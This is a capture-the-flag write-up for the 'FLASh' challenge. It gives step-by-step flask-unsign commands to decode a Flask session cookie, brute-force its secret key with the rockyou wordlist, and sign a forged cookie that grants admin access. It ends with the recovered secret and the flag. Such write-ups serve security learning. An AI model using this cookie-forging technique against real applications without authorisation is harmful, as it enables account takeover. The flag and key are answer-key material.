# GHCTF-FLASh-challenge

## Challenge Description

**Name:** FLASh

**Points:** 455

**Description:** FLASh FLASh ...f denia Kifou maKech.

**Challenge link:** [FLASh challenge link](http://greenhat.microclub.info:5620/login)

**Goal:** Gain admin access by manipulating the JWT token.

## Tools and Techniques

**Tools:** flask-unsign

**Techniques:**

- Flask cookie decoding and encoding
- Brute-forcing secret key
- Cookie manipulation

## Solution

### Initial Approach

**Step 1:** Inspected the webpage and found a JWT token in the cookies.

**Step 2:** Decoded the JWT token using an online JWT decoder.

Decoded JWT:

```
{

'admin': False,

'username': 'guest'

}
```

**Step 3:** Tried to modify the payload directly and replace the token, but it was rejected by the server due to an invalid signature.

It wasn't a JWT token , it was a flask cookie 

### Detailed Solution

- **Step 1:** Identify the need to brute-force the secret key.
  
  Based on the challenge hint "FLASh", it suggested the use of the Flask framework, which uses a secret key to sign tokens.

- **Step 2:** Install flask-unsign.

  Open Cmd and run:

  ```pip install flask-unsign```

- **Step 3:** Decode the flask cookie using flask-unsign.
  
  Command :

  ```flask-unsign --decode --cookie "eyJhZG1pbiI6ZmFsc2UsInVzZXJuYW1lIjoiZ3Vlc3QifQ.ZqOMzQ.SpPqBdMSQC6ojJADF2OrON3DVbc"```

   Decoded cookie :

  `{'admin': False, 'username': 'guest'}`
  
- **Step 4 :** Download the [rockyou.txt wordlist](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt).
  
- **Step 5:** Use flask-unsign to brute-force the cookie using the rockyou.txt wordlist.

  **Initial Attempt to Brute-force the Secret Key:**
  
   Command :

  ```flask-unsign --unsign --wordlist "C:\Users\PC\Desktop\rockyou.txt" --cookie "eyJhZG1pbiI6ZmFsc2UsInVzZXJuYW1lIjoiZ3Vlc3QifQ.ZqOMzQ.SpPqBdMSQC6ojJADF2OrON3DVbc"```

   Result: Encountered an error indicating the need to use the --no-literal-eval argument.

   **Retrying with the Correct Argument:**

   Command : 

   ```flask-unsign --unsign --wordlist "C:\Users\PC\Desktop\rockyou.txt" --cookie "eyJhZG1pbiI6ZmFsc2UsInVzZXJuYW1lIjoiZ3Vlc3QifQ.ZqOMzQ.SpPqBdMSQC6ojJADF2OrON3DVbc" --no-literal-eval```

   This successfully brute-forced the secret key, avoiding the previous error. Secret key : `'helloall'`

- **Step 6:** Create a new token with the admin changed to "True"

   Command :

   ```flask-unsign --sign --cookie "{'admin': True, 'username': 'guest'}" --secret 'helloall'```

   New Token :

   ```eyJhZG1pbiI6dHJ1ZSwidXNlcm5hbWUiOiJndWVzdCJ9.ZqOYOw.6hfVRtWwsvQVfCg8kSkCDxQZkWU```

- **Step 7:** Replace the original token in the browser’s cookies with the new token.
  
- **Step 8:** Reload the webpage to verify admin access.

   Successfully logged in as an admin and obtained the flag.

## The Flag :

# microCTF{54y_H3ll0_0nLy_t0_Y0ur_Fr13nd5_H!h!h4}
  

  

